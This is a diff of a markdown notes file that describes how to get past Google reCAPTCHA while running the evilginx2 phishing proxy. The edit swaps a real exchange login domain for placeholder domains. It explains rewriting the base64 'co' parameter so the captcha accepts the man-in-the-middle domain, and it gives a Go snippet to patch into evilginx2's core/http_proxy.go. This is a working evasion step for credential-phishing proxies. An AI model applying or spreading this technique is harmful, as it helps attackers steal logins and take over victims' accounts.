@@ -11,12 +11,12 @@
 
 ### Google Recaptcha Bypass by [@Desire](https://twitter.com/DWORKWITH)
 - Google recaptcha encodes domain in base64 and includes it in `co` parameter in GET request.
-- For Example in Binance us Login.
+- For Example in safe-domain (Demo) Login.
   ```
-  https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LePlpgbAAAAAPlPfzzXnJ1lrMTqRWgouzDcSd3b&co=aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw..&hl=en&v=vP4jQKq0YJFzU6e21-BGy3GP&size=invisible&cb=knko72z68i8y
-- Here the parameter `co` contains string `co=aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw..` which is the base64 encoding of `https://accounts.binance.us:443`
-- We can modify this to `https://accounts.anydomain.com:443` and encode it in base64 `aHR0cHM6Ly9hY2NvdW50cy5hbnlkb21haW4uY29tOjQ0Mw` and replace the parameter with this new value.
-- We should be able to bypass the google recaptcha.
+  https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LePlpgbAAAAAPlPfzzXnJ1lrMTqRWgouzDcSd3b&co=aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz&hl=en&v=vP4jQKq0YJFzU6e21-BGy3GP&size=invisible&cb=knko72z68i8y
+- Here the parameter `co` contains string `co=aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz` which is the base64 encoding of `https://accounts.safe-domain.com:443`
+- In case if we use MITM in between with the mitm domain `fake-domain.com`, the value for the `co` parameter will be set to `https://accounts.fake-domain.com:443` encoded in base64 `aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg`  which is not a valid domain , So we need to modify this parameter value to the original domain `https://accounts.safe-domain.com:443` base64 encoded `aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz`
+
 - Here is the work around code to implement this. Replace the code in evilginx2 `core/http_proxy.go` line 409
 ```
 				// patch GET query params with original domains & bypass recaptcha
@@ -26,8 +26,8 @@
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-							if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw.." { // https://accounts.binance.us:443
-								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5hbnlkb21haW4uY29tOjQ0Mw" // https://accounts.anydomain.com:443
+							if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
+								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
 							}
 							}
 						}
